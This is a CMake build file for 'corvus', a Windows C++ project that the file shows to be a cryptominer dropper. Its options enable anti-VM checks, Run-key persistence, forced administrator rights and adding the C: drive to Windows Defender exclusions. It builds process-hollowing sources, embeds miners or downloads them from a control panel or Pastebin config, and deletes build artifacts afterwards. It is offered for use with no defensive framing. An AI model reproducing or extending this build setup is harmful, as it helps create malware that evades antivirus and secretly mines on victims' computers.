cmake_minimum_required(VERSION 3.10)
project(corvus)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Link MSVC runtime statically
if(MSVC)
    foreach(flag_var CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE CMAKE_CXX_FLAGS_MINSIZEREL CMAKE_CXX_FLAGS_RELWITHDEBINFO)
        if(${flag_var} MATCHES "/MD")
            string(REGEX REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
        endif()
        if(${flag_var} MATCHES "/MDd")
            string(REGEX REPLACE "/MDd" "/MTd" ${flag_var} "${${flag_var}}")
        endif()
    endforeach()
endif()

add_definitions(-DUNICODE -D_UNICODE)

# Generate embedded config header from JSON
include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)

# Accept config path from builder, with fallback to client resources
if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
    set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
endif()

set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")
if(ENABLE_EMBEDDED_CONFIG OR EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
    message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
    generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
endif()

# Optional Debug Console feature
option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
if(ENABLE_DEBUG_CONSOLE)
    message(STATUS "Debug console enabled")
endif()

# Optional Anti-VM feature
option(ENABLE_ANTIVM "Enable Anti-VM detection" OFF)

# Optional Persistence feature
option(ENABLE_PERSISTENCE "Enable persistence via Run key" OFF)

# Optional Admin Manifest feature
option(ENABLE_ADMIN_MANIFEST "Require administrator privileges" OFF)
if(ENABLE_ADMIN_MANIFEST)
    message(STATUS "Admin manifest enabled - executable will require administrator privileges")
    add_definitions(-DENABLE_ADMIN_MANIFEST)
endif()

# Optional Windows Defender Exclusion feature
option(ENABLE_DEFENDER_EXCLUSION "Add C: drive to Windows Defender exclusion" OFF)
if(ENABLE_DEFENDER_EXCLUSION)
    message(STATUS "Windows Defender exclusion enabled - will add C: drive to exclusion list")
    add_definitions(-DENABLE_DEFENDER_EXCLUSION)
endif()

# Optional Remote Miners feature
option(ENABLE_REMOTE_MINERS "Download miners from panel instead of embedding" OFF)
if(ENABLE_REMOTE_MINERS)
    message(STATUS "Remote miners enabled - miners will be downloaded from panel")
    add_definitions(-DENABLE_REMOTE_MINERS)
endif()

# Optional GET Config URL feature
set(CONFIG_GET_URL "" CACHE STRING "Direct GET URL for config fetching (instead of POST)")
if(CONFIG_GET_URL)
    message(STATUS "Config GET URL enabled: ${CONFIG_GET_URL}")
    add_definitions(-DCONFIG_GET_URL="${CONFIG_GET_URL}")
endif()

# Embedded Config only for Pastebin/GET method (not for panel/POST)
# Panel version has direct panel connectivity, doesn't need fallback
# Pastebin version needs fallback when pastebin is offline
if(CONFIG_GET_URL)
    set(ENABLE_EMBEDDED_CONFIG ON)
    message(STATUS "Embedded fallback config enabled (Pastebin/GET mode)")
    add_definitions(-DENABLE_EMBEDDED_CONFIG)
else()
    set(ENABLE_EMBEDDED_CONFIG OFF)
    message(STATUS "Embedded fallback config disabled (Panel/POST mode)")
endif()

# Source files
set(SRC_FILES
    src/main.cpp
    src/util.cpp
    src/pe_hdrs_helper.cpp
    src/hollowing_parts.cpp
    src/delete_pending_file.cpp
    src/http_client.cpp
    src/json_printer.cpp
    src/process_info.cpp
    src/config_manager.cpp
)

# Resource files (only if not using remote miners)
if(NOT ENABLE_REMOTE_MINERS)
    set(RESOURCE_FILES
        resources/embedded_resource.rc
    )
    message(STATUS "Embedding miner resources in executable")
else()
    set(RESOURCE_FILES)
    message(STATUS "Skipping resource embedding - using remote download")
endif()

# Header files
set(HEADER_FILES
    include/util.h
    include/kernel32_undoc.h
    include/ntddk.h
    include/pe_hdrs_helper.h
    include/hollowing_parts.h
    include/delete_pending_file.h
    include/http_client.h
    include/json_printer.h
    include/json.hpp
    include/process_info.h
    include/config_manager.h
)

# Add Anti-VM files if enabled
if(ENABLE_ANTIVM)
    message(STATUS "Anti-VM detection enabled")
    add_definitions(-DENABLE_ANTIVM)
    list(APPEND SRC_FILES src/antivm.cpp)
    list(APPEND HEADER_FILES include/antivm.h)
endif()

# Add Persistence files if enabled
if(ENABLE_PERSISTENCE)
    message(STATUS "Persistence enabled")
    add_definitions(-DENABLE_PERSISTENCE)
    list(APPEND SRC_FILES src/persistence.cpp)
    list(APPEND HEADER_FILES include/persistence.h)
endif()

# Miners are now embedded as resources in the executable
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
if(MSVC)
    # Enable resource compilation for MSVC
    enable_language(RC)
endif()
if(NOT MSVC)
	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
endif()
set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")

# Create executable
add_executable(corvus 
    #WIN32 
    ${SRC_FILES}
    ${RESOURCE_FILES}
    ${HEADER_FILES}
)

# Set linker flags for GUI subsystem (hide console)
set_target_properties(corvus PROPERTIES
    OUTPUT_NAME corvus
)

if(MSVC)
	target_compile_options(corvus PRIVATE /W0)
else()
	target_compile_options(corvus PRIVATE -w)
endif()

# Link libraries
if(MSVC)
	target_link_libraries(corvus
		winhttp.lib
		ntdll.lib
		wbemuuid.lib
		ole32.lib
		oleaut32.lib
	)
else()
	target_link_libraries(corvus
		-lwinhttp
		-lntdll
		-lwbemuuid
		-lole32
		-loleaut32
	)
endif()

# Add admin manifest if enabled
if(ENABLE_ADMIN_MANIFEST)
	if(MSVC)
		set_target_properties(corvus PROPERTIES
			LINK_FLAGS "${LINK_FLAGS} /MANIFESTUAC:\"level=requireAdministrator uiAccess=false\""
		)
	endif()
endif()

# Include directories
target_include_directories(corvus PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_BINARY_DIR}/generated
)

# Installation
install(TARGETS corvus
    DESTINATION ${CMAKE_INSTALL_PREFIX}
    COMPONENT corvus
)

add_custom_command(TARGET corvus POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/CMakeFiles
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/CMakeCache.txt
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/cmake_install.cmake
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/Makefile
    COMMENT "Auto-removing CMake-generated files"
)

message(STATUS "Project configured for build")